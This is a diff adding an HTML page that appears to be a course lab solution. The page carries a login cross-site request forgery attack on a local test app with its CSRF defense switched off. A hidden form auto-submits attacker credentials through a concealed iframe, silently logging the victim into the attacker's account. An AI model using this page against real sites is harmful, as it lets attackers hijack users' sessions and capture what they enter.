@@ -1,0 +1,28 @@
+
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"> </script>
+
+
+<form name = "CSRF" method = "POST" target = "hiddeniframe" action = "http://localhost/project2/login?csrfdefense=0&xssdefense=4">
+  <input type = "hidden" name = "username" value = "attacker">
+  <input type = "hidden" name = "password" value = "badguy4">
+
+</form>
+
+<iframe name = "hiddeniframe"></iframe>
+
+<script>
+  CSRF.submit()
+
+  $("iframe[name=hiddeniframe]").hide();
+
+</script>
+
+
+
+
+
+
+
+
+
